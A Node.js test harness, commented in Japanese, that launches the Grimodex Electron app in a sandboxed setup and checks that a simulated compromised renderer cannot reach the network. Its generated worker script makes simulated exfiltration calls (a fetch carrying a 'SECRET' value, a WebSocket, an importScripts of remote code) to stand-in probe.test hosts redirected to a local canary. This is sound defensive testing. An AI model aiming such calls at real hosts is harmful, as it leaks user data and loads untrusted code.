/**
 * Y-1: 乗っ取られた renderer 相当のコードからの外向きの試みを実機（Electron）で確かめる
 * 道具（K3/2「renderer の隔離とその固定」3、Negative (23)。DA-1）。
 *
 *   node electron/scripts/renderer-isolation-probe.mjs [--out <record.json>] [--keep]
 *        [--countermeasure <name>] [--electron-arg <switch>] [--legacy-control] [--no-sandbox]
 *
 * 何をするか:
 * - 本体の protocol.ts、security.ts、windows.ts、downloadGuard.ts を esbuild で束ねた probe 用の
 *   main を、一時 userData と一時 dist（app://bundle）で Electron に起動する。
 * - main は restricted の gate と窓の title の固定を有効にして、本体の窓に任意の JS を実行する
 *   （renderer-isolation-probe-renderer.js）。
 * - 外への通信の遮断と記録は Chromium に効く方法で行う: `--host-resolver-rules`（`*.probe.test`
 *   だけを 127.0.0.1 の canary に向け、ほかの host は ~NOTFOUND）と `--log-net-log`
 *   （Everything）。env の proxy は Chromium を止めないので使わない。canary は loopback の
 *   TCP と UDP で、受信した接続と先頭の bytes を数える。
 * - 試験ごとの marker（host に含める nonce）が net log のどこかに現れたら「網に届いた」とする。
 *
 * 起動の規則（electron-spike-isolation）: `scripts/local-ci-xvfb.mjs` を host namespace で使い、
 * WAYLAND_DISPLAY、XDG_SESSION_TYPE、DBUS_SESSION_BUS_ADDRESS を外し、
 * ELECTRON_OZONE_PLATFORM_HINT=x11 にする。`unshare -n` の中で Xvfb を動かさない。
 * `package.json` に script を足さず、`node` で直接実行する。
 *
 * 記録 file（既定は renderer-isolation-probe.record.json）には Electron の版を書く。
 * Electron の版上げの PR で、記録の版と package.json の版が一致しないと
 * electron/main/rendererIsolationProbeRecord.test.ts が失敗し、Y-1 のやり直しが要ると分かる。
 */
import { spawn } from "node:child_process";
import { randomBytes } from "node:crypto";
import dgram from "node:dgram";
import fs from "node:fs";
import net from "node:net";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

import esbuild from "esbuild";

const here = path.dirname(fileURLToPath(import.meta.url));
const root = path.resolve(here, "..", "..");
const DEFAULT_RECORD = path.join(here, "renderer-isolation-probe.record.json");
const TIMEOUT_MS = 120_000;

function parseArgs(argv) {
  const args = {
    out: DEFAULT_RECORD,
    keep: false,
    countermeasure: "",
    noSandbox: false,
    legacyControl: false,
    electronArgs: [],
  };
  for (let i = 0; i < argv.length; i += 1) {
    const arg = argv[i];
    if (arg === "--out") args.out = path.resolve(argv[++i]);
    else if (arg === "--keep") args.keep = true;
    else if (arg === "--countermeasure") args.countermeasure = argv[++i] ?? "";
    else if (arg === "--no-sandbox") args.noSandbox = true;
    else if (arg === "--legacy-control") args.legacyControl = true;
    else if (arg === "--electron-arg") args.electronArgs.push(argv[++i]);
    else throw new Error(`unknown argument: ${arg}`);
  }
  return args;
}

// ── canary（loopback の TCP と UDP）────────────────────────────────────────

async function startCanary() {
  const hits = [];
  const record = (proto, data) =>
    hits.push({
      proto,
      at: Date.now(),
      head: data.toString("latin1").slice(0, 400),
    });
  const tcp = net.createServer((socket) => {
    // 接続だけで data が来ない場合も数える。payload は接続の時刻に帰属させる。
    const connectedAt = Date.now();
    hits.push({ proto: "tcp-connect", at: connectedAt, head: "" });
    socket.on("data", (data) =>
      hits.push({
        proto: "tcp",
        at: connectedAt,
        head: data.toString("latin1").slice(0, 400),
      }),
    );
    socket.on("error", () => {});
    socket.setTimeout(3000, () => socket.destroy());
  });
  await new Promise((resolve, reject) => {
    tcp.once("error", reject);
    tcp.listen(0, "127.0.0.1", resolve);
  });
  const port = tcp.address().port;
  const udp = dgram.createSocket("udp4");
  await new Promise((resolve, reject) => {
    udp.once("error", reject);
    udp.bind(port, "127.0.0.1", resolve);
  });
  udp.on("message", (msg) => record("udp", msg));
  return {
    port,
    hits,
    close: async () => {
      await new Promise((r) => tcp.close(() => r()));
      await new Promise((r) => udp.close(() => r()));
    },
  };
}

// ── probe 用の bundle ────────────────────────────────────────────────────

async function buildBundles(work, nonce) {
  const bundle = path.join(work, "bundle");
  const dist = path.join(work, "dist");
  fs.mkdirSync(path.join(dist, "assets"), { recursive: true });
  fs.mkdirSync(bundle, { recursive: true });
  const common = {
    bundle: true,
    platform: "node",
    format: "cjs",
    target: "node22",
    external: ["electron", "*.node"],
    logLevel: "error",
  };
  await Promise.all([
    esbuild.build({
      ...common,
      entryPoints: [path.join(here, "renderer-isolation-probe-main.mjs")],
      outfile: path.join(bundle, "main.cjs"),
    }),
    esbuild.build({
      ...common,
      entryPoints: [path.join(root, "electron", "preload", "index.ts")],
      outfile: path.join(bundle, "preload.cjs"),
    }),
    // 本物の force-layout worker（vite の module worker と同じ ES module）。
    esbuild.build({
      bundle: true,
      platform: "browser",
      format: "esm",
      target: "chrome130",
      logLevel: "error",
      entryPoints: [
        path.join(
          root,
          "src",
          "features",
          "map",
          "layouts",
          "forceLayout.worker.ts",
        ),
      ],
      outfile: path.join(dist, "assets", "forceLayout.worker.js"),
    }),
  ]);
  const workerBody = (kind) => `
    const run = async (msg) => {
      const out = { realm: "${kind}", fetch: "?", ws: "?", importScripts: "?" };
      try { await fetch("http://" + msg.host + ":" + msg.port + "/w?d=SECRET-worker"); out.fetch = "completed"; } catch (e) { out.fetch = "error:" + e.name; }
      try { const ws = new WebSocket("ws://" + msg.host + "-ws:" + msg.port + "/w"); out.ws = "constructed"; } catch (e) { out.ws = "throw:" + e.name; }
      try { importScripts("http://" + msg.host + "-is:" + msg.port + "/i.js"); out.importScripts = "completed"; } catch (e) { out.importScripts = "error:" + e.name; }
      await new Promise((r) => setTimeout(r, 500));
      self.postMessage(out);
    };
    self.onmessage = (e) => run(e.data);`;
  fs.writeFileSync(
    path.join(dist, "assets", "probe-worker.js"),
    workerBody("classic"),
  );
  fs.writeFileSync(
    path.join(dist, "assets", "probe-worker-module.js"),
    workerBody("module").replace(
      "importScripts(",
      "(() => { throw new TypeError('importScripts is not available in module workers'); })(",
    ),
  );
  fs.writeFileSync(
    path.join(dist, "index.html"),
    "<!doctype html><html><head><meta charset=utf-8><title>Grimodex</title></head><body><p>probe</p></body></html>",
  );
  fs.writeFileSync(path.join(dist, "assets", "data.json"), "{}");
  fs.writeFileSync(path.join(dist, "assets", "readme.md"), "# md");
  fs.writeFileSync(path.join(dist, "assets", "data.unknownext"), "bin");
  fs.writeFileSync(path.join(dist, "assets", "app.js"), "// no-op");
  // 1x1 の PNG
  fs.writeFileSync(
    path.join(dist, "assets", "pixel.png"),
    Buffer.from(
      "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGP4z8DwHwAFAAH/q842iQAAAABJRU5ErkJggg==",
      "base64",
    ),
  );
  void nonce;
  return { bundle, dist };
}

// ── 起動 ─────────────────────────────────────────────────────────────────

function electronBinary() {
  const electronDir = path.dirname(
    fileURLToPath(import.meta.resolve("electron/package.json")),
  );
  const rel = fs
    .readFileSync(path.join(electronDir, "path.txt"), "utf8")
    .trim();
  return path.join(electronDir, "dist", rel);
}

function runElectron({ work, bundle, dist, port, nonce, args }) {
  const env = { ...process.env };
  // desktop への漏れを断つ（electron-spike-isolation）。
  for (const key of [
    "WAYLAND_DISPLAY",
    "WAYLAND_SOCKET",
    "XDG_SESSION_TYPE",
    "DBUS_SESSION_BUS_ADDRESS",
    "ELECTRON_RENDERER_URL",
    "ELECTRON_RUN_AS_NODE",
    "HTTP_PROXY",
    "HTTPS_PROXY",
    "ALL_PROXY",
    "http_proxy",
    "https_proxy",
    "all_proxy",
  ]) {
    delete env[key];
  }
  env.ELECTRON_OZONE_PLATFORM_HINT = "x11";
  env.PROBE_USER_DATA = path.join(work, "userData");
  env.PROBE_DIST = dist;
  env.PROBE_RESULT = path.join(work, "result.json");
  env.PROBE_PORT = String(port);
  env.PROBE_NONCE = nonce;
  env.PROBE_RENDERER_SCRIPT = path.join(
    here,
    "renderer-isolation-probe-renderer.js",
  );
  env.PROBE_COUNTERMEASURE = args.countermeasure;
  if (args.legacyControl) env.PROBE_LEGACY = "1";
  fs.mkdirSync(env.PROBE_USER_DATA, { recursive: true });

  const netLog = path.join(work, "netlog.json");
  const electronArgs = [
    ...(args.noSandbox ? ["--no-sandbox"] : []),
    ...args.electronArgs,
    `--host-resolver-rules=MAP *.probe.test 127.0.0.1, MAP * ~NOTFOUND, EXCLUDE 127.0.0.1, EXCLUDE localhost`,
    `--log-net-log=${netLog}`,
    "--net-log-capture-mode=Everything",
    path.join(bundle, "main.cjs"),
  ];
  const wrapper = path.join(root, "scripts", "local-ci-xvfb.mjs");
  return new Promise((resolve) => {
    // 独立した process group にして、timeout で Xvfb と Electron の子まで止める。
    const child = spawn(
      process.execPath,
      [wrapper, electronBinary(), ...electronArgs],
      {
        env,
        stdio: ["ignore", "pipe", "pipe"],
        detached: true,
      },
    );
    let output = "";
    child.stdout.on("data", (d) => (output += d));
    child.stderr.on("data", (d) => (output += d));
    let timedOut = false;
    const killGroup = (signal) => {
      try {
        process.kill(-child.pid, signal);
      } catch {
        // すでに終了している。
      }
    };
    const timer = setTimeout(() => {
      timedOut = true;
      killGroup("SIGTERM");
      setTimeout(() => killGroup("SIGKILL"), 5000);
    }, TIMEOUT_MS);
    child.on("close", (code, signal) => {
      clearTimeout(timer);
      killGroup("SIGKILL");
      resolve({
        code,
        signal,
        output,
        timedOut,
        netLog,
        resultPath: env.PROBE_RESULT,
      });
    });
  });
}

// ── net log の解析 ──────────────────────────────────────────────────────

/** net log から、marker（host の nonce 付き名前）を含む event を集める。 */
function analyzeNetLog(netLogPath, nonce, port) {
  if (!fs.existsSync(netLogPath)) return { error: "no net log" };
  let text = fs.readFileSync(netLogPath, "utf8");
  // 異常終了で閉じていない net log を許す。
  let log;
  try {
    log = JSON.parse(text);
  } catch {
    text = text.replace(/,\s*$/, "") + "]}";
    log = JSON.parse(text);
  }
  const typeNames = Object.fromEntries(
    Object.entries(log.constants.logEventTypes).map(([k, v]) => [v, k]),
  );
  const sourceTypes = Object.fromEntries(
    Object.entries(log.constants.logSourceType).map(([k, v]) => [v, k]),
  );
  const markerRe = new RegExp(`([a-z0-9]+)-${nonce}\\.probe\\.test`, "g");
  const attempts = new Map(); // kind -> { events:Set, sources:Set }
  const otherHosts = new Map(); // 非 probe の host -> event types
  const lookups = [
    "HOST_RESOLVER",
    "URL_REQUEST",
    "SOCKET",
    "TCP_CONNECT",
    "UDP",
    "PROXY",
    "DNS",
    "HTTP",
  ];
  for (const event of log.events ?? []) {
    const name = typeNames[event.type] ?? String(event.type);
    const json = JSON.stringify(event.params ?? {});
    const source = sourceTypes[event.source?.type] ?? "?";
    const relevant = lookups.some(
      (p) => name.startsWith(p) || source.startsWith(p),
    );
    let m;
    markerRe.lastIndex = 0;
    let matched = false;
    while ((m = markerRe.exec(json)) !== null) {
      matched = true;
      const entry = attempts.get(m[1]) ?? {
        events: new Set(),
        sources: new Set(),
      };
      entry.events.add(name);
      entry.sources.add(source);
      attempts.set(m[1], entry);
    }
    if (!matched && relevant) {
      const hostMatch = json.match(
        /"(?:host|hostname|url|host_and_port|address)":"([^"]+)"/,
      );
      if (hostMatch) {
        const value = hostMatch[1];
        if (
          !/127\.0\.0\.1|localhost|probe\.test|^app:|^blob:|^data:|^\[::1\]/.test(
            value,
          )
        ) {
          const entry = otherHosts.get(value) ?? new Set();
          entry.add(name);
          otherHosts.set(value, entry);
        }
      }
    }
  }
  void port;
  return {
    attempts: Object.fromEntries(
      [...attempts].sort().map(([kind, v]) => [
        kind,
        {
          eventTypes: [...v.events].sort(),
          sourceTypes: [...v.sources].sort(),
        },
      ]),
    ),
    otherHosts: Object.fromEntries(
      [...otherHosts].sort().map(([host, types]) => [host, [...types].sort()]),
    ),
  };
}

// ── main ────────────────────────────────────────────────────────────────

async function main() {
  const args = parseArgs(process.argv.slice(2));
  const nonce = randomBytes(4).toString("hex");
  const work = fs.mkdtempSync(path.join(os.tmpdir(), "grimodex-probe-"));
  const canary = await startCanary();
  try {
    const { bundle, dist } = await buildBundles(work, nonce);
    const run = await runElectron({
      work,
      bundle,
      dist,
      port: canary.port,
      nonce,
      args,
    });
    if (!fs.existsSync(run.resultPath)) {
      console.error(run.output.slice(-4000));
      throw new Error(
        `probe produced no result (code=${run.code}, signal=${run.signal})`,
      );
    }
    const result = JSON.parse(fs.readFileSync(run.resultPath, "utf8"));
    if (result.fatal) throw new Error(`probe main failed: ${result.fatal}`);
    const net = analyzeNetLog(run.netLog, nonce, canary.port);
    // canary の受信を、renderer の試験の実行窓（startedAt〜endedAt）に帰属させる。
    const probes = result.rendererResults.filter(
      (r) => r.startedAt !== undefined,
    );
    const hitsByProbe = new Map();
    const unattributedHits = [];
    for (const hit of canary.hits) {
      const owner = probes.find(
        (p) => hit.at >= p.startedAt && hit.at <= p.endedAt,
      );
      if (owner) {
        const entry = hitsByProbe.get(owner.id) ?? {
          tcpConnections: 0,
          tcpPayloads: 0,
          udpPackets: 0,
        };
        if (hit.proto === "tcp-connect") entry.tcpConnections += 1;
        else if (hit.proto === "tcp") entry.tcpPayloads += 1;
        else if (hit.proto === "udp") entry.udpPackets += 1;
        hitsByProbe.set(owner.id, entry);
      } else {
        unattributedHits.push(hit.proto);
      }
    }
    const markerRe = new RegExp(`([a-z0-9]+)-${nonce}\\.probe\\.test`, "g");
    const canarySawSecret = canary.hits.some((h) => /SECRET/.test(h.head));
    const canaryMarkers = [
      ...new Set(
        canary.hits.flatMap((h) =>
          [...h.head.matchAll(markerRe)].map((m) => m[1]),
        ),
      ),
    ].sort();
    // 網に届いた試み = canary が受信した試験（TCP の接続、payload、UDP）と、net log に
    // marker が現れた kind。0 件であること。
    const reachedNetwork = [
      ...new Set([...hitsByProbe.keys(), ...Object.keys(net.attempts ?? {})]),
    ].sort();
    // marker のない外向きの観測を分類する（開示の「続く通信」との照合用）。
    const classified = {
      spellcheckerDictionary: [],
      ipv6ReachabilityProbe: [],
      localUdpSockets: 0,
      other: [],
    };
    for (const [host, types] of Object.entries(net.otherHosts ?? {})) {
      if (/gvt1\.com|gvt2\.com/.test(host))
        classified.spellcheckerDictionary.push(host);
      else if (/^\[2001:4860:4860::8888\]:443$/.test(host))
        classified.ipv6ReachabilityProbe.push(`${host} (${types.join("+")})`);
      else if (/^(0\.0\.0\.0|\[::\]):\d+$/.test(host))
        classified.localUdpSockets += 1;
      // 規則（`~NOTFOUND` への書換え）で拒否された名前。外向きの観測ではない。NC-1 の下では
      // net log の host が `~NOTFOUND:<port>` の形で出る
      else if (/^(https:\/\/)?~notfound(:\d+)?$/i.test(host)) continue;
      else classified.other.push(host);
    }
    classified.spellcheckerDictionary.sort();
    classified.other.sort();
    const record = {
      schema: 1,
      electron: result.electron,
      chrome: result.chrome,
      platform: result.platform,
      variant: args.legacyControl
        ? "legacy-control"
        : [args.countermeasure, ...args.electronArgs]
            .filter(Boolean)
            .join(" ") || "product",
      processSandbox: !args.noSandbox,
      webPreferences: result.webPreferences,
      reachedNetwork,
      reachedNetworkDetail: Object.fromEntries(
        reachedNetwork.map((id) => [
          id,
          {
            canary: hitsByProbe.get(id) ?? null,
            netLog: net.attempts?.[id] ?? null,
          },
        ]),
      ),
      canary: {
        tcpConnections: canary.hits.filter((h) => h.proto === "tcp-connect")
          .length,
        tcpPayloads: canary.hits.filter((h) => h.proto === "tcp").length,
        udpPackets: canary.hits.filter((h) => h.proto === "udp").length,
        unattributed: unattributedHits.length,
        secretsSeen: canarySawSecret,
        markers: canaryMarkers,
      },
      unattributed: classified,
      title: {
        lockedStaysProduct:
          result.title.afterRendererSetItWhileLocked === result.title.product,
        unlockedControlChanged:
          result.title.afterRendererSetItWhileUnlocked !== result.title.product,
        // grim:panel-open の title option を renderer が渡しても、固定中の窓は製品名
        panelOpenOptionStaysProduct:
          result.title.panelOpenOptionWhileLocked === "Grimodex" &&
          !String(result.title.panelOpenOptionWhileLocked).includes("PANEL-"),
      },
      navigation: {
        willNavigateHosts: result.observed.willNavigate.length,
        windowOpenHosts: result.observed.windowOpen.length,
        newWindows: result.observed.newWindow,
        windowCount: result.windowCount,
      },
      downloads: {
        observed: result.observed.downloads,
        results: result.downloadResults,
        notices: result.downloadNotices,
      },
      fileSystemAccessPicker: result.picker,
      windowPrint: result.print,
      runCompleted: !run.timedOut,
      renderer: result.rendererResults.map(({ id, outcome }) => ({
        id,
        outcome,
      })),
    };
    // WebRTC（RTCPeerConnection の ICE server）の経由か。CSP は ICE server の URL を制限しない。
    const isWebRtc = (id) => /^webrtc\./.test(id) || /\.rtc$/.test(id);
    record.violations = reachedNetwork.length;
    record.violationsViaWebRtc = reachedNetwork.filter(isWebRtc);
    record.violationsOutsideWebRtc = reachedNetwork.filter(
      (id) => !isWebRtc(id),
    );
    fs.mkdirSync(path.dirname(args.out), { recursive: true });
    // 実行ごとに変わる nonce は記録に残さない。
    fs.writeFileSync(
      args.out,
      `${JSON.stringify(record, null, 2).split(nonce).join("<nonce>")}\n`,
    );
    console.log(
      `[probe] electron ${record.electron} variant=${record.variant} violations=${record.violations} (outside WebRTC: ${record.violationsOutsideWebRtc.length}) out=${path.relative(root, args.out)}`,
    );
    if (args.keep) console.log(`[probe] work dir kept: ${work}`);
  } finally {
    await canary.close();
    if (!args.keep) fs.rmSync(work, { recursive: true, force: true });
  }
}

main().catch((error) => {
  console.error(error instanceof Error ? error.message : String(error));
  process.exitCode = 1;
});
